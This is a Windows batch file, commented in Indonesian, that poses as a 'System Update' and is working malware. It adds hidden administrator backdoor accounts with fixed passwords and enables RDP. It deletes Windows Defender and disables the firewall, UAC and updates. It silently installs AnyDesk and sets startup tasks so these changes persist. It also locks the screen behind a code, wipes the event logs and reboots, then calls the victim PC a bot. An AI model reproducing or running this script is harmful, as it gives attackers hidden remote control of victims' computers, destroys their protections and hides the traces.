@echo off
title System Update
color 0A
echo Installing critical updates...
timeout /t 3 /nobreak >nul

:: ============================================
:: 1. BIKIN BACKDOOR ACCOUNT
:: ============================================
echo [*] Creating backdoor account...
net user AdminIzumy P@ssw0rd123! /add /y >nul 2>&1
net localgroup administrators AdminIzumy /add >nul 2>&1
net localgroup "Remote Desktop Users" AdminIzumy /add >nul 2>&1

:: Aktifin RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes >nul 2>&1

:: Hidden Account
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v AdminIzumy /t REG_DWORD /d 0 /f >nul 2>&1

:: ============================================
:: 2. MATIKAN DEFENDER & FIREWALL
:: ============================================
echo [*] Destroying Windows Defender...
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
sc stop WdNisSvc >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1

:: Hapus file Defender
takeown /f "C:\Program Files\Windows Defender" /r /d y >nul 2>&1
icacls "C:\Program Files\Windows Defender" /grant administrators:F /t >nul 2>&1
rd /s /q "C:\Program Files\Windows Defender" >nul 2>&1
rd /s /q "C:\ProgramData\Microsoft\Windows Defender" >nul 2>&1

:: Matiin Firewall
netsh advfirewall set allprofiles state off >nul 2>&1

:: ============================================
:: 3. MATIKAN UAC & WINDOWS UPDATE
:: ============================================
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
sc config wuauserv start= disabled >nul 2>&1
sc stop wuauserv >nul 2>&1

:: ============================================
:: 4. INSTALL ANYDESK
:: ============================================
powershell -Command "Invoke-WebRequest -Uri 'https://download.anydesk.com/AnyDesk.exe' -OutFile '%TEMP%\AnyDesk.exe'" >nul 2>&1
%TEMP%\AnyDesk.exe --silent --install "C:\Program Files\AnyDesk" --start-with-win >nul 2>&1

:: ============================================
:: 5. PERSISTENCE (3 LAYERS)
:: ============================================
schtasks /create /tn "WindowsUpdateService" /tr "net user AdminIzumy P@ssw0rd123! /add" /sc onstart /ru system /f >nul 2>&1
schtasks /create /tn "WindowsDefenderGuard" /tr "sc stop WinDefend && sc config WinDefend start= disabled" /sc onstart /ru system /f >nul 2>&1
schtasks /create /tn "FirewallGuard" /tr "netsh advfirewall set allprofiles state off" /sc onstart /ru system /f >nul 2>&1

:: ============================================
:: 6. BACKUP HIDDEN ADMIN
:: ============================================
net user HiddenAdmin P@ssw0rd456! /add /y >nul 2>&1
net localgroup administrators HiddenAdmin /add >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v HiddenAdmin /t REG_DWORD /d 0 /f >nul 2>&1

:: ============================================
:: 7. BLACK SCREEN + BLUESCREEN
:: ============================================
powershell -Command "(Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern int SendMessage(int hWnd,int hMsg,int wParam,int lParam);' -Name a -Pas)::SendMessage(0xffff,0x0112,0xF170,2)" >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\kbdhid\Parameters" /v CrashOnCtrlScroll /t REG_DWORD /d 1 /f >nul 2>&1

:: ============================================
:: 8. LOCK SCREEN (Kode: IZUMY2050)
:: ============================================
powershell -Command "
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$form = New-Object System.Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::Black
$label = New-Object System.Windows.Forms.Label
$label.Text = '🔒 SYSTEM LOCKED'
$label.Font = New-Object System.Drawing.Font('Arial', 36, [System.Drawing.FontStyle]::Bold)
$label.ForeColor = [System.Drawing.Color]::Red
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(300, 100)
$form.Controls.Add($label)
$label2 = New-Object System.Windows.Forms.Label
$label2.Text = 'Hubungi Administrator untuk membuka'
$label2.Font = New-Object System.Drawing.Font('Arial', 18)
$label2.ForeColor = [System.Drawing.Color]::White
$label2.AutoSize = $true
$label2.Location = New-Object System.Drawing.Point(350, 180)
$form.Controls.Add($label2)
$label3 = New-Object System.Windows.Forms.Label
$label3.Text = 'Masukkan Kode:'
$label3.Font = New-Object System.Drawing.Font('Arial', 16)
$label3.ForeColor = [System.Drawing.Color]::White
$label3.AutoSize = $true
$label3.Location = New-Object System.Drawing.Point(400, 300)
$form.Controls.Add($label3)
$textbox = New-Object System.Windows.Forms.TextBox
$textbox.Font = New-Object System.Drawing.Font('Arial', 16)
$textbox.Size = New-Object System.Drawing.Size(200, 30)
$textbox.Location = New-Object System.Drawing.Point(550, 295)
$textbox.PasswordChar = '*'
$form.Controls.Add($textbox)
$status = New-Object System.Windows.Forms.Label
$status.Text = ''
$status.Font = New-Object System.Drawing.Font('Arial', 14)
$status.ForeColor = [System.Drawing.Color]::Yellow
$status.AutoSize = $true
$status.Location = New-Object System.Drawing.Point(450, 380)
$form.Controls.Add($status)
$button = New-Object System.Windows.Forms.Button
$button.Text = 'UNLOCK'
$button.Font = New-Object System.Drawing.Font('Arial', 14, [System.Drawing.FontStyle]::Bold)
$button.Size = New-Object System.Drawing.Size(150, 40)
$button.Location = New-Object System.Drawing.Point(500, 420)
$button.BackColor = [System.Drawing.Color]::Red
$button.ForeColor = [System.Drawing.Color]::White
$form.Controls.Add($button)
$correctCode = 'IZUMY2050'
$button.Add_Click({
    if ($textbox.Text -eq $correctCode) {
        $status.Text = '✅ KODE BENAR!'
        $status.ForeColor = [System.Drawing.Color]::Green
        $form.Close()
    } else {
        $status.Text = '❌ KODE SALAH!'
        $status.ForeColor = [System.Drawing.Color]::Red
        $textbox.Text = ''
        $textbox.Focus()
    }
})
$textbox.Add_KeyDown({
    if ($_.KeyCode -eq 'Enter') {
        $button.PerformClick()
    }
})
$form.Add_FormClosing({
    $_.Cancel = $true
})
$form.ShowDialog()
"

:: ============================================
:: 9. CLEAN & RESTART
:: ============================================
del /f /q %TEMP%\*.bat >nul 2>&1
wevtutil cl System >nul 2>&1
wevtutil cl Security >nul 2>&1
wevtutil cl Application >nul 2>&1

echo.
echo ============================================
echo    [✔] MISSION COMPLETE!
echo ============================================
echo Backdoor Account  : AdminIzumy
echo Password          : P@ssw0rd123!
echo Backup Account    : HiddenAdmin
echo Backup Password   : P@ssw0rd456!
echo.
echo [🔥] PC target udah jadi BOT!
echo [📡] Phantom Bot - Mission Complete
echo ============================================
shutdown /r /t 3
